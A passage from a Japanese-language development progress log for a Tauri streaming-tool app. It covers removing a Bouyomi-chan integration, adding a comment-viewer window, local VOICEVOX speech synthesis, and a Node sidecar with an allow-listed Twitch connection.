  広域走査群（`bouyomi_install_dir`/`bouyomi_process_dir`/`bouyomi_candidate_dirs`/`subdirs_starting_with`/`env_join`/
  `voicevox_exe_path`/`bouyomi_exe_path`）を削除。**sysinfo の潜在コンパイルエラー（Cargo.toml macOS 依存）も同時に解消**。
- **Phase 4（frontend 導線）**: prepare gate 文言を「ツール管理へ登録」へ更新。未登録部品に**「ツール管理へ追加」ボタン**を
  併設（voicevox/棒読みちゃんのみ・SAPI は誘導のみ）。`RakurakuToolsScreen` に `onRequestAddTool` prop を追加し `App.tsx` から
  配線（プリフィル名 state＋戻り先 origin）。`AddToolScreen` に `prefillName`/`returnTo` prop を軽微追加（**名称のみプリフィル・
  パスは従来のファイル選択ダイアログ readOnly**＝生パス注入なし）。
- **セキュリティ**: security-review 実施＝**判定「問題なし」**（広域走査・sysinfo 廃止で攻撃面縮小／自動起動は登録済み
  `executablePath` のみ・管理付き spawn で §6 整合／frontend は固定語・表示名のみで生パス非受領／capability・CSP・依存は
  差分ゼロ〔`lib.rs` の起動コマンド登録・bindings の `LaunchResult`/`bouyomiRunning` は本コミットが内包する「032b 修正」delta
  として対 HEAD では変更あり・Rust↔TS drift ゼロ〕／バックアップ先取り・`starts_with` 維持／app_logs 非増加）。詳細は
  `docs/security.md`「### 032b 修正2 …」節。
- **検証**: 各 Phase 末で mac `cargo check`（非 Windows）/ `typecheck` / `lint` = pass。`gen:bindings` の **drift ゼロ**（型構造不変）。
  **Windows `imp`（scan/configure/`bouyomi_running`）は mac では未コンパイル**＝実コンパイル・実機 E2E は 098 が初。
- **098 へ持ち越し**: 登録済みツール前提での scan/configure/launch/verify、**棒読み起動中に configure したときの設定上書き有無**
  （launch を configure の後に置く既存順序を維持）、VOICEVOX 起動待ち時間、SettingBase.xml スキーマ確定。
- **変更ファイル**: `src-tauri/src/rakuraku/{integrations/bouyomi_voicevox.rs,integrations/mod.rs,commands.rs,service.rs,model.rs}` /
  `src-tauri/src/process/service.rs` /
  `src/App.tsx`・`src/screens/{rakuraku-tools/RakurakuToolsScreen.tsx,add-tool/AddToolScreen.tsx}` /
  `docs/{security.md,product.md,progress.md,tasks/032-rakuraku-auto-setup-design.md,tasks/032b-bouyomi-voicevox-integration.md}`。
  `Cargo.toml`/`Cargo.lock`/`capabilities/default.json`/`tauri.conf.json` は**不変**。`lib.rs`（`rakuraku_launch_component` 登録）・
  bindings（`LaunchResult` 新規・`ScanResult.bouyomiRunning`）は本コミットが内包する「032b 修正」delta として対 HEAD では変更あり。

## 2026-07-15 (032c 方針転換設計・棒読み/SAPI 撤去→VOICEVOX 直接合成の2段化・mac 検証可へ)

### 032c 内蔵コメントビューア × VOICEVOX 直接読み上げ（設計確定・実装は 032c-a〜d へ分割）

らくらくツール設定の中核目的（配信者が簡単にずんだもんの声でコメントを読ませる）を、手段を全面転換して達成する
設計を確定。032b（棒読みちゃん×VOICEVOX・4段連鎖・Windows 専用・SAPI レジストリ昇格が必要・098 まで未検証で main
投入という重い前提）を目的について全面 supersede し、**内蔵コメビュ ＋ VOICEVOX ENGINE の HTTP 合成 API
（/audio_query + /synthesis）直叩き → WAV ローカル再生**の2段方式へ置換する。本タスクは設計のみでコード・依存・
capability・security.md/product.md 本文は変更しない（実改訂は 032c-a〜d）。変更は docs/task-board.md（実装順注記）と
本 progress.md の2ファイルのみ。設計ファイルは既に設計確定のため再編集せず。

- **方針転換の要旨**: 棒読みちゃん/SAPI 経路を撤去し、osareview 由来の簡易コメントビューアを内蔵＋VOICEVOX 合成 API
  直叩きへ2段化。Windows 専用・実機未検証という 032b の前提を解消し、**mac 開発機で E2E 検証可能**になる。ミニマムは
  YouTube と Twitch。
- **論点1〜7 の確定**: ①取得対象＝YouTube+Twitch 両方 ②取得アーキ＝osareview backend を単一実行ファイル化し Node
  sidecar（externalBin）同梱・viewer は localhost WS(17331) ③合成＝viewer webview で 127.0.0.1:50021 を fetch＋Web Audio
  再生・TTS 直列 FIFO キュー・話者ずんだもん(speaker 3 既定) ④別窓＝Rust WebviewWindowBuilder で
  open_comment_viewer_window（ラベル comment-viewer・単一インスタンス）・新 capability 追加/main 不変 ⑤内蔵コメビュ＝
  ToolKind::Internal 新設で SQLite へ冪等 seed・プリセット組込可 ⑥セキュリティ＝§1 初解禁ほか（下記）⑦コスト＝両
  サービス金銭$0、YouTube のみ無料クォータ 10,000 units/日。
- **実装分割と順序**: 032c-a（コメビュ別窓枠組み＋内蔵デフォルトツール＋032b 撤去・ネットワーク無・mac 検証可）→
  032c-c（VOICEVOX 直接合成＋TTS キュー・モックで先行可）→ 032c-b（Node sidecar 基盤＋Twitch 取得＋インターネット通信
  初解禁・security-review 必須）→ 032c-d（YouTube 取得有効化・OAuth PKCE/Client Secret 同梱）→ E2E 統合。
- **032b の撤去範囲と supersede**: 撤去は 032c-a で実施（本設計では範囲の確定・記録のみ）。対象＝bouyomi_voicevox.rs／
  棒読み専用コマンド（rakuraku_configure_integration 等）／integrationRegistry の bouyomi-voicevox エントリ／
  RakurakuToolsScreen の棒読み実行経路／Cargo.toml の ureq（用途が残らなければ）／security.md・product.md の 032b 記述。
  残すもの＝rakuraku slice・process spawn/PID registry・open_url・らくらく画面枠組み（032a）。
- **セキュリティ方針の改訂方針（§1 初解禁ほか・実改訂は 032c-b/-c/-d）**: security.md に新章「コメントビューア
  （配信サービス連携）方針」を追加。§1 を **StreamDock 初の能動的インターネット通信として allow-list 宛先限定・ユーザー
  明示接続時のみ**解禁（Twitch/YouTube 宛先。telemetry/analytics は全面禁止）。通信面は Node sidecar と viewer webview に
  封じ込め、main は no-internet 維持。§4（Node sidecar/externalBin）・loopback 50021 を合成 API へ拡張・§9（OAuth トークン
  取扱）・§10（依存・capabilities）・CSP 方針を明文化。明示同意＋security-review 必須。product.md は「外部通信をしない」の
  例外と YouTube クォータ制限を記録。
- **task-board 反映**: Todo の 032c 行直下に実装順注記（032c-a → 032c-c → 032c-b → 032c-d → E2E 統合）と設計ファイル・
  032b 撤去範囲へのポインタを追加。032b は独立行を持たず 032c で supersede・撤去は 032c-a と整理済み（既存）。
- **やらないこと/次**: osareview リッチ機能移植・TTS 高度化・YouTube+Twitch 同時表示・OAuth keyring 永続化・CSP 硬化は
  ミニマム対象外。次は 032c-a 着手時に詳細実装計画を提示。

### 032c-a コメビュ別ウィンドウ枠組み ＋ 内蔵デフォルトツール ＋ 032b 撤去（ネットワーク無・mac 検証可・2 コミット）

032c 方針転換の第一歩。内蔵コメントビューアを別ウィンドウ（label `comment-viewer`）で開く枠組みと、それを内蔵
デフォルトツール（`ToolKind::Internal`）としてツール管理／プリセットに組み込める状態を用意。あわせて方針転換で不要に
なった 032b（棒読み/SAPI 依存）を撤去し docs を整理した。**ネットワーク通信は一切含まず**（Twitch/YouTube 取得・Node
sidecar・VOICEVOX API・Web Audio・OAuth は 032c-b/-c/-d）、コメントは**モック `CommentViewDto`** のみ描画＝mac で E2E 完結。
退行切り分けのため **2 コミット**に分割した。

- **別ウィンドウ枠組み**: `lib.rs` に `#[tauri::command] fn open_comment_viewer_window`（単一目的コマンド）を追加。
  単一インスタンスガード＝`get_webview_window("comment-viewer")` があれば `show()+set_focus()`、無ければ
  `WebviewWindowBuilder`（label `comment-viewer`・`WebviewUrl::App("index.html")`・420×640）で生成。invoke_handler に登録。
  内蔵ツールの launch dispatch 両経路からも `crate::open_comment_viewer_window(app.clone())` で呼ぶ（`pub(crate)` にすると
  tauri command マクロの再エクスポートと衝突するため plain `fn`＝子モジュールから可視）。
- **comment-viewer capability**: `capabilities/comment-viewer.json` 新設。**ネイティブタイトルバー方式**を採用し
  `permissions: ["core:default"]` の 1 つのみ（カスタム Header 再利用はせず window 操作権限は不要）。`windows: ["comment-viewer"]`。
  **`default.json`／main capability は不変**。
- **ToolKind::Internal**: `model.rs` に `Internal` 追加（`as_str`→"internal"／`from_str_lenient` に "internal"、`_=>Executable`
  フォールバック維持・`#[default]` は Executable のまま）。`tools/service.rs` の create/update の kind 分岐に Internal арм
  （executable_path 空・url None）。`repository::init` に固定 id `builtin-comment-viewer` の**冪等 seed**
  （`INSERT OR IGNORE`・kind='internal'・path 空・url NULL・部分ユニーク index の対象外で非衝突）。TS binding 再生成で
  `ToolKind.ts` が `"executable" | "url" | "internal"` に更新。
- **launch dispatch 両経路**（Internal 分岐を spawn catch-all の前に・validate_executable/spawn skip・PID registry 非登録）:
  `process::service::launch_one`（url guard と同位置に match arm）と `process::commands::launch_tool`（url early-return と spawn
  の間に if）。autostart 経路（`launch_preset_targets`→`launch_one`）も同分岐を通る。
- **モックコメント描画**: 新設 `features/comment-viewer/types.ts`（手書き `CommentViewDto = {id, source, author{id,name}, text,
  publishedAt, eventType, monetaryAmount?}`）と `screens/comment-viewer/CommentViewerApp.tsx`（seed＋「モックを追加」で
  **append＋id 重複排除（Set）＋上限クランプ（200）**を実演。role トークン CSS でライト/ダーク両対応）。`App.tsx` は
  現本体を `MainWindowApp` にリネームし、`getCurrentWindow().label` で `comment-viewer`→CommentViewerApp を出し分ける薄い
  ラッパに（同一 Vite バンドル・main.tsx 不変・マルチ HTML 不要）。
- **internal UI ガード**: 削除不可（Sidebar の削除ボタン非表示＋`App.handleDeleteTool` 多重防御）／コア（name/kind/id）編集不可
  （`AddToolScreen` で内蔵編集時は表示名 readonly・種別は「内蔵ツール」固定表示・実行パス/URL 欄なし）／「内蔵」バッジ
  （Sidebar・`ToolRow` の status 列）／`ToolRow`・`MainScreen` で url と同様に「開く」ボタンのみ（PID 管理外・`launchTool`→Rust
  dispatch）。プリセット組込は通常ツールと同様に可能。
- **032b 撤去範囲**:
  - 削除（Rust）: `rakuraku/integrations/bouyomi_voicevox.rs` 全体／`Integration` trait の `configure`/`verify`／
    `IntegrationCtx.backup_root`／`service.rs::registry()`→空 `Vec::new()`／`commands.rs` の `rakuraku_configure_integration`・
    `rakuraku_verify_integration` と `backup_root`・`context` の app 依存／`model.rs` の `Configure*`/`Verify*` 型／`lib.rs`
    invoke_handler の 2 行。
  - 削除（frontend）: `integrationRegistry.ts` の bouyomi-voicevox エントリ→`[]`／`rakurakuApi.ts` の configure/verify ラッパ／
    `RakurakuToolsScreen` ExecutionView の設定書換/疎通経路（scan/prepare/launch の器は温存）。
  - 条件付き削除（**grep で他用途ゼロを確認済み・両方 YES**）: `Cargo.toml` の `ureq`（実利用は bouyomi_voicevox.rs:178 のみ）と
    windows feature `Win32_System_Registry`（Reg*/HKEY 参照は同ファイルのみ）。Cargo.lock は `ureq` 1 パッケージのみ削除。
  - binding: ts-rs は削除型の .ts を消さないため残骸 4 ファイル（Configure/Verify Result/Status）を手動 rm。
  - 残した共有部: rakuraku slice（scan/launch/open_official_page・Integration trait 骨格・`resolve_tool_for_component`）／
    spawn＋PID registry・open_url／`validate_executable`／らくらく画面シェル 032a（ListView/DetailView/ConsentView）。空
    `registry()` でも `find` は NotFound を返すのみでらくらく画面はクラッシュしない。
- **docs 整理**: `security.md` の §1 ループバック例外・§5 設定書換例外・らくらく方針節の棒読み/SAPI/ureq/config-rewrite 部分・
  §032b/§032b修正/§032b修正2 レビュー記録を撤去し、代わりに **§032c-a 撤去のレビュー記録**（判定＝問題なし）へ集約。
  `product.md` の棒読み/SAPI/設定書換の例外を整理。**外部通信の新規解禁追記は含めない**（VOICEVOX 通信方針は 032c-b で再定義）。
- **security-review（コミット1 の docs＋撤去差分に実施）＝判定 問題なし**: 外部通信（ureq/loopback）・外部設定書換・レジストリ
  読取の限定解禁を全撤去し §1/§5 の一般原則へ復帰。新規 command/capability/依存の追加なし（`rakuraku_*` は 2 本削減）。
  internal のパス検証 skip は別窓オープンのみで shell/spawn/ファイル操作を伴わない。docs は撤去/整理に留まり外部通信の解禁
  追記なし。
- **2 コミット構成**: ①032b 撤去＋docs 整理（退行を切り分け・security-review 適用）②別窓枠組み＋内蔵ツール＋モック描画＋
  binding 再生成同梱。
- **検証（mac で完結）**: `cargo check` / `pnpm typecheck` / `pnpm lint` すべて pass。`pnpm gen:bindings` の drift ゼロ
  （コミット1=rakuraku 残骸 4 削除のみ・コミット2=ToolKind.ts の internal 追加のみ）。`comment-viewer.json` は JSON 妥当。
  空 registry でらくらく画面がクラッシュしないことをコード経路で確認。実機表示（`pnpm tauri dev`）は macOS 環境で確認予定
  （別窓オープン＋モック描画の append/重複排除/クランプ・内蔵ツールの冪等 seed/プリセット組込/削除不可/コア編集不可/内蔵
  バッジ・ライト/ダーク両テーマ）。

#### 変更ファイル
- 新規: `apps/desktop/src-tauri/capabilities/comment-viewer.json`、`apps/desktop/src/features/comment-viewer/types.ts`、
  `apps/desktop/src/screens/comment-viewer/CommentViewerApp.tsx`（＋`.module.css`）
- Rust: `src-tauri/src/lib.rs`、`tools/model.rs`、`tools/repository.rs`、`tools/service.rs`、`process/service.rs`、
  `process/commands.rs`、`rakuraku/{integrations/mod.rs,service.rs,commands.rs,model.rs}`、`Cargo.toml`、`Cargo.lock`
- 削除: `src-tauri/src/rakuraku/integrations/bouyomi_voicevox.rs`、`src/features/rakuraku/bindings/{ConfigureResult,ConfigureStatus,VerifyResult,VerifyStatus}.ts`
- frontend: `src/App.tsx`、`components/Sidebar.tsx`（＋`.module.css`）、`screens/main/{ToolRow.tsx,MainScreen.tsx}`（＋`MainScreen.module.css`）、
  `screens/add-tool/AddToolScreen.tsx`、`features/rakuraku/{integrationRegistry.ts,rakurakuApi.ts,types.ts}`、
  `screens/rakuraku-tools/RakurakuToolsScreen.tsx`、`features/tools/bindings/ToolKind.ts`（生成物）
- docs: `docs/security.md`、`docs/product.md`、`docs/progress.md`

### 032c-c VOICEVOX 直接合成 ＋ TTS キュー（ずんだもん・Web Audio・新依存ゼロ・mac 検証可・4 コミット）

らくらくツール設定の中核目的「配信者が簡単にずんだもんの声でコメントを読ませる」を実現。viewer webview（別窓
`comment-viewer`）から**ローカルの VOICEVOX ENGINE**（`http://127.0.0.1:50021`・ループバック）へ `fetch` で合成 API を
直接投げ、返る WAV を **Web Audio** でローカル再生する。棒読み/SAPI は 032c-a で撤去済み。コメントは 032c-a のモック
`CommentViewDto` で検証（Twitch/YouTube 取得・Node sidecar・OAuth は 032c-b/-d でスコープ外）。**新依存ゼロ**（Rust に
`reqwest`/`rodio` を足さず fetch＋Web Audio のみ）。依存は 032c-a のみ・032c-b と相互独立・mac 完結で E2E 検証可。

- **直接合成（新依存ゼロ）**: `features/comment-viewer/voicevox.ts` に `synthesize`（`POST /audio_query?text=&speaker=`
  → query JSON → `POST /synthesis?speaker=`（body=query JSON）→ WAV `ArrayBuffer`）・`checkEngineRunning`（GET /version）・
  `playWav`（AudioContext を受け取る純粋再生プリミティブ・`decodeAudioData`→`AudioBufferSourceNode`→`onended` 解決）・
  `ZUNDAMON_NORMAL_SPEAKER_ID` 定数を実装。
- **Web Audio 直列再生 ＋ TTS キュー**: `features/comment-viewer/ttsQueue.ts`（`createTtsQueue`）に FIFO 直列・再生中フラグ・
  `onended` で次へ・バックログ上限 `MAX_BACKLOG=20`（超過は**古い未読から破棄**・破棄件数を `console.debug`）・最小整形
  （URL 除去・絵文字 `\p{Extended_Pictographic}` 除去・空白畳み込み）・**著者名は読まない**・id 冪等（単一注入点の二重
  enqueue 無害化）。AudioContext は viewer に 1 つ・ユーザー操作契機で `resume`（WKWebView autoplay 対策）。
- **単一注入点（mergeComments）**: `CommentViewerApp.tsx` の `mergeComments(prev, incoming)` を **`{ next, added }`** を
  返す形へ最小リファクタ（`added`＝重複排除後に実際に追加された新規行・クランプ前）。`addMock`（将来の実データハンドラも）
  が `added` を TTS へ enqueue。再投入した `dup`（seed-1）は `added` に入らず読み上げられない＝注入点が正しく機能。
- **ENGINE 検出 ＋ 起動誘導**: viewer で GET `/version` を 5 秒ポーリング。未起動時に起動誘導バナー（「VOICEVOX を起動」）を
  表示。ボタンは `features/comment-viewer/voicevoxApi.ts` の `launchVoicevoxEngine()` → 薄い新 command
  `launch_voicevox_engine`（`lib.rs`）。command は frontend 引数ゼロで、`resolve_tool_for_component`（登録済みツールを
  exe 名一致で解決・Executable 限定・**OS 別 `VOICEVOX.app`/`VOICEVOX.exe`**）→ `process::service::spawn`＋`register` の
  管理付き spawn（`rakuraku_launch_component` と同経路）。未登録なら `launched=false` で「ツール管理に登録してください」誘導・
  絶対パス直起動しない・`registry()` は空のまま。
- **comment-viewer.json 追加の有無**: **追加なし**。アプリ定義 command は本構成の capability permission に列挙不要
  （main の `default.json` は約30個のアプリ command を1つも列挙せず invoke 成功）。viewer からの `launch_voicevox_engine`
  invoke 可否は E2E ④で確認する（拒否時のみ最小 command 許可を 1 行追加する方針）。main capability・CSP（`csp: null`）不変。
- **ずんだもんクレジット**: 032a の `creditNotice`（git 履歴 `22099e2` で削除）を復元し viewer に常時表示。文言＝
  「ずんだもんの音声を使う配信・動画では「VOICEVOX:ずんだもん」のクレジット表記が必須です（VOICEVOX 利用規約
  https://voicevox.hiroshiba.jp/term/ に準拠）。」。体裁は `RakurakuToolsScreen` の見出し（「クレジット表記のお願い（必須）」
  ＋段落）を踏襲し `.credit*` を `--danger` で自己完結スタイル（外部通信は発生しない・URL は静的表示）。
- **loopback 50021 例外の（再）定義**: `docs/security.md` §1 に「例外（032c-c…）」を新設し、許可範囲＝`127.0.0.1:50021` への
  GET `/version`＋POST `/audio_query`＋POST `/synthesis`＋WAV の Web Audio ローカル再生に限定（インターネット・Node
  sidecar・OAuth に波及しない旨を明記）。らくらく方針節の **stale pointer**（「032c-b で定義」）を「032c-c で（再）定義した」に
  修正。新例外は **50021 のみ**を列挙（棒読み 50001 は撤去済みで含めない）。`csp: null` は当面維持。
- **speaker id 実機スパイク（要フォロー）**: 既定はずんだもん（ノーマル）= VOICEVOX speaker **3**（親設計）で定数化済み
  （`ZUNDAMON_NORMAL_SPEAKER_ID = 3`）。**本セッションでは ENGINE 未起動のためスパイク未実施**。ENGINE 起動状態で
  `curl -s http://127.0.0.1:50021/speakers | jq '.[] | select(.name=="ずんだもん") | .styles[] | select(.name=="ノーマル") | .id'`
  を実行し、観測値が **3 と一致するか**を確認する（異なれば定数を更新）。観測値は本節に追記する。
- **security-review**: docs（§1 例外・stale pointer）＋コード差分に security-review スキルを適用し、**判定＝問題なし**
  （修正必須なし）。loopback 50021 例外が合成＋WAV ローカル再生に限定され、インターネット・sidecar・OAuth に波及しないこと・
  管理付き spawn（絶対パス直起動でない）・capability/CSP 不変・新依存ゼロ・binding drift ゼロを確認。詳細は
  本ファイル末尾「2026-07-23 セキュリティレビュー実施記録（docs/security.md から移設）」内の
  「032c-c … security-review 実施済み」記録を参照（2026-07-23 に security.md から移設）。
- **4 コミット構成**: ①単発合成＋Web Audio 再生（speaker 定数化・暫定テストボタン）②TTS キュー＋モック連動（mergeComments
  `{next,added}`）③ENGINE 検出＋起動誘導＋新 command＋クレジット（bindings 再生成同梱）④docs/security.md 例外（再）定義＋
  security-review＋progress.md。
- **検証（mac で完結）**: `cargo check` / `pnpm typecheck` / `pnpm lint` すべて pass。`pnpm gen:bindings` は 032c-c 由来の
  drift ゼロ（`LaunchResult` 再利用で新規 ts-rs 型なし）。**別件の既存 drift**: `rakuraku/bindings/ScanResult.ts` が 032c-a の
  Rust doc 更新に対し未再生成のまま（doc コメントのみ・型 shape 不変・`check:bindings` が rakuraku を対象外のため未検出）。
  032c-c では revert して混入させていない（別途整理推奨）。`Cargo.toml`/`package.json` 差分なし（新依存ゼロ）。実機
  （`pnpm tauri dev`・ENGINE 起動状態）は macOS 環境で確認予定: ①モックがずんだもんの声で FIFO 直列に読まれ音が重ならない
  ②上限超過で古い未読破棄 ③URL/絵文字除去 ④未起動検出→起動誘導→登録済み VOICEVOX を管理付き spawn 起動（未登録は誘導）
  ⑤クレジット表示 ⑥通信は 127.0.0.1:50021 loopback のみ・インターネット無し／既存機能に退行なし。

#### 変更ファイル
- 新規: `apps/desktop/src/features/comment-viewer/voicevox.ts`、`ttsQueue.ts`、`voicevoxApi.ts`
- Rust: `apps/desktop/src-tauri/src/lib.rs`（`launch_voicevox_engine` command ＋ `generate_handler!` 1 行）
- frontend: `apps/desktop/src/screens/comment-viewer/CommentViewerApp.tsx`（＋`.module.css`）
- docs: `docs/security.md`、`docs/progress.md`
- 不変（確認済み）: `Cargo.toml`／`package.json`（新依存ゼロ）、`capabilities/{comment-viewer,default}.json`、
  `tauri.conf.json`（`csp: null`）、`bindings/*`（032c-c 由来の drift ゼロ）

### 032c-b Node sidecar 基盤 ＋ Twitch コメント取得 ＋ viewer WS 接続 ＋ インターネット通信 初解禁（StreamDock 初の能動的インターネット通信・mac 検証可・3 コミット）

032c 方針転換の高リスク中核。内蔵コメントビューア（032c-a で枠実装済み）に **実 Twitch コメント**を流して描画するまでを、
**Twitch allow-list 宛先・ユーザー明示接続時のみ・Node sidecar 封じ込め**の条件付きで実装し、StreamDock で初めての能動的
インターネット通信を解禁した。TTS は繋がない（032c-c 実装済み・表示まで）／YouTube は含めない（032c-d）。依存前提は 032c-a のみ。

- **sidecar 実行方式（tsc→esbuild→SEA）**: osareview の Twitch 経路のみを **vendor（コピー）**した新パッケージ
  `apps/comment-sidecar` を新設。`createTwitchPipeline`/DI 登録を Twitch 専用に distill、auth entry を fork して in-memory
  `TokenStore`＋no-op BrowserLauncher に差替（YouTube/gRPC・keyring・`open`・hono/zod・dotenv を import グラフから排除）。
  ビルドは `tsc`（`emitDecoratorMetadata`）→`esbuild`（単一 CJS・`ws` の `bufferutil`/`utf-8-validate` を external）→**Node SEA**
  （`postject` 注入→`codesign` 再署名）。出力 `apps/desktop/src-tauri/binaries/comment-sidecar-<triple>`（gitignore・build:sea で生成）。
- **ライフサイクル/ポート管理（Rust は同期のまま）**: `tauri-plugin-shell` を追加（Rust 専用・**capability に `shell:*` ゼロ**）。
  singleton `Mutex<Option<CommentSidecar>>` を `app.manage`、`open_comment_viewer_window` 内で `app.shell().sidecar()` spawn。
  実ポートは sidecar が `COMMENT_SIDECAR_PORT=<port>` を stdout に出し、Rust が別スレッド `blocking_recv` で受領（async crate 不追加）。
  viewer は読み取り専用 command `get_comment_stream_port` で実ポートを取得してから `ws://127.0.0.1:<port>` に接続。
  17331 が使用中なら sidecar が空きポートへフォールバック。
- **3 段 no-orphan kill＋RunEvent::Exit 追加**: ①viewer 窓の `WindowEvent::Destroyed`/`CloseRequested`（`on_window_event`）
  ②`RunEvent::Exit`（**従来 lib.rs に無く新設**＝`.run(ctx)` を `.build(ctx).run(|_,e|…)` に分割）③sidecar 側 ppid 監視
  （`process.kill(parentPid,0)` の生存確認で親消滅時 self-exit・mac に PDEATHSIG が無い保険）。
- **単一双方向 WS トランスポート**: `WebSocketCommentOutputPort`（osareview）を再利用＋inbound 制御ハンドラを新設。
  viewer→sidecar＝`start-login`/`start-session`(channel)/`stop-session`、sidecar→viewer＝`device_code`/`session.state`/`comments.append`。
  api-gateway の hono/zod/17332 は使わない（YouTube/gRPC を top-level import で引きずるため）。
- **Device Code UI（open 廃止・spike 3 解消）**: auth fork に `loginTwitchWithDeviceCode` を新設し、polling 前に
  `user_code`/`verification_uri` を WS 提示（osareview が user_code を破棄していたギャップを解消）。viewer は Device Code パネル
  （Twitch 接続・チャンネル入力・取得開始/停止・コード/URL テキスト提示・状態表示・両テーマ）でユーザー明示操作時のみ発火。
- **Rust 正規化 CommentViewDto＋ts-rs binding**: `src-tauri/src/comment_viewer/model.rs` を ts-rs 化→`comment-viewer/bindings/`
  生成、`features/comment-viewer/types.ts` を binding 再エクスポートへ置換（frontend 専用モック撤去）。sidecar が osareview→正規化
  して送るので **wire＝型＝描画が一致**。`check:bindings` に `comment-viewer/bindings` を追加。
- **allow-list 二層強制（fail-closed）**: ①env ピン留め＝`Pinned*ConfigProvider` で全 base URL を定数化（override 分岐撤去・
  Client ID は esbuild define でビルド時焼き込み・ランタイム env/dotenv 不使用）②ホストガード＝global `fetch` と ws 生成を包み
  `{id.twitch.tv, api.twitch.tv, eventsub.wss.twitch.tv, *.wss.twitch.tv}`・非 HTTPS/WSS 以外を throw。**ユニットテスト
  （`scripts/test-host-guard.mjs`）で全 10 ケース PASS**（`evil.com`・スキーム・サブドメイン偽装 `api.twitch.tv.evil.com` 拒否、
  reconnect wildcard 許可）。全 fetch/ws 経路（初回＋reconnect）がガードを通ることを grep 確認。
- **追加/落とした依存の理由**: 追加＝Rust `tauri-plugin-shell`（sidecar を Rust から起動/停止・権限ゼロ）、Node ビルド時
  `esbuild`/`postject`、Node ランタイム `ws`/`tsyringe`/`reflect-metadata`。落とした＝`@grpc/grpc-js`+`proto-loader`（YouTube 除外）・
  `@napi-rs/keyring`（in-memory 化・native addon 排除）・`open`（テキスト提示）・`hono`+`@hono/node-server`+`zod`（単一 WS に統合）・
  `dotenv`（env 注入しない）。汎用 Rust crate・async/WS/HTTP crate は追加なし。
- **封じ込め検証結果（mac ヘッドレス分）**: SEA バイナリ実行で **decorator metadata 生存（実 tsyringe DI で Twitch グラフ解決）**・
  ポート受け渡し・pure-JS `ws` 疎通・codesign 通過を確認（smoke）。**親 kill -9 で ppid self-exit（orphan テスト PASS）**。
  grpc/keyring/hono が bundle・binary に**不在（exact 検査）**。**実機の `lsof` 封じ込め（外部ソケットが sidecar PID 下のみ・
  main no-internet）と実 Twitch E2E は mac GUI（`TWITCH_CLIENT_ID` 設定→`tauri dev`）で実施予定**。
- **security.md/product.md 改訂＋security-review**: security.md に新章「## コメントビューア（配信サービス連携）方針」を追加、
  §1 に「例外（032c-b…）」＋032c-c forward-ref 更新、§4（sidecar 例外）・§9（トークン取扱）・§10/Capabilities（`tauri-plugin-shell`
  権限ゼロ＋externalBin・落とした依存）・レビュー必須条件（本連携）・032c-b security-review 記録を追記。product.md に外部通信例外。
  **security-review スキルを適用し判定＝問題なし**（修正必須なし。後回し＝loopback WS 未認証のみ・token/device_code は WS 非送出で実害小）。
- **実機スパイク 8 件の結果**: ①decorator metadata が tsc→esbuild→SEA 生存＝**PASS**（SEA 内で `container.resolve` 動作）
  ②YouTube/gRPC transitive 排除＝**PASS**（bundle/binary exact grep で不在）③device-code user_code 表出ギャップ＝**解消**
  （sidecar-local orchestration＋`open` 廃止・コミット2）④externalBin パス解決＋target-triple＝命名 `comment-sidecar-<host-triple>`
  一致を確認（`app.shell().sidecar()` の dev/bundle 実解決は GUI で最終確認）⑤macOS 孤児化＝**PASS**（親 kill -9 で self-exit。
  当初 `process.ppid` キャッシュで検知漏れ→`process.kill(ppid,0)` 生存確認に修正）⑥ポート受け渡しタイミング＝**PASS**（viewer は
  実ポート確定までポーリング）⑦SEA 署名＝**PASS**（postject 後 `codesign -s -`→`--verify` 通過）⑧`ws` optional native addon＝**PASS**
  （external 化で pure-JS 動作）。
- **3 コミット構成**: ①sidecar 基盤（インターネット無し・ダミー comments_append で疎通実証／spike 1/2/4/5/6/7/8）②Twitch Device Code
  ＋EventSub/Helix＋正規化 CommentViewDto＋binding＋allow-list 二層強制（インターネット解禁／spike 3 解消）③docs 改訂＋security-review。
- **検証（mac で完結）**: `pnpm --filter @stream-dock/comment-sidecar typecheck`／`pnpm --filter ./apps/desktop typecheck`／`lint`／
  `cargo check`／`build:sea`／host-guard ユニット／smoke／orphan すべて pass。`gen:bindings` は comment-viewer/bindings 新規のみで
  既存 drift ゼロ（`check:bindings` PASS）。**既存 drift（別件）**: `rakuraku/bindings/ScanResult.ts` は 032c-c 同様 revert し混入させていない。

#### 変更ファイル
- 新規: `apps/comment-sidecar/`（package.json・tsconfig・`scripts/{build-sea,smoke,test-host-guard}.mjs`・vendor 済み Twitch ソース・
  `src/{index,host-guard,wire,twitch-config}.ts`・`src/auth/*`・`src/comment-fetcher/*`）、
  `apps/desktop/src-tauri/src/comment_sidecar/mod.rs`、`apps/desktop/src-tauri/src/comment_viewer/{mod,model}.rs`、
  `apps/desktop/src/features/comment-viewer/{commentStream.ts,bindings/*}`
- Rust: `apps/desktop/src-tauri/src/lib.rs`（`get_comment_stream_port`・spawn＋`on_window_event`・`RunEvent::Exit`・mod 宣言）、
  `Cargo.toml`（`tauri-plugin-shell`）
- 設定: `apps/desktop/src-tauri/tauri.conf.json`（`bundle.externalBin`・`csp: null` 不変）、`.gitignore`（sidecar バイナリ）、
  `apps/desktop/package.json`（`check:bindings` 拡張）
- frontend: `apps/desktop/src/features/comment-viewer/types.ts`（binding 再エクスポートへ置換）、
  `apps/desktop/src/screens/comment-viewer/CommentViewerApp.tsx`（＋`.module.css`・Device Code UI／WS 接続）
- docs: `docs/security.md`（新章＋§1/§4/§9/§10/レビュー必須条件/032c-b 記録）、`docs/product.md`、`docs/progress.md`
- 不変（確認済み）: `capabilities/{comment-viewer,default}.json`（`shell:*` ゼロ）、`tauri.conf.json` の `csp: null`、
  Rust の同期性（async crate 不追加）

### 032c-b′ コメントビューア 実利用UX修正（再ログイン解消＝ログイン永続化 ／ チャンネル保持 ／ 実コメント読み上げ・要 再 security-review）

実 Twitch 接続テストで判明した 3 つの UX/機能問題を修正した。

- **issue 3（実コメントを読み上げない・モックは読む）**: `onComments` が `mergeComments(...).added` を捨てて `enqueueForSpeech`
  を呼んでいなかった（032c-b は意図的に「表示まで」）。実データを TTS に配線。実データはユーザー操作を伴わず届くため、
  「コメント取得開始」ボタン（ユーザー操作）で AudioContext を resume し、`ttsQueue.pump` に suspended ハングガード
  （running でなければ resume 試行→不可ならその 1 件スキップ）を追加して無音ハングを塞いだ。
- **issue 2（チャンネル名が空欄化）**: `channel` を `localStorage`（`channelStorage.ts`・theme.ts と同方式）で保持。窓の
  再オープン・アプリ再起動でも復元。
- **issue 1（毎回ログインし直し）＝§9 ポリシー変更**: Twitch OAuth トークンを **OS キーチェーンに永続化**（Rust 所有・
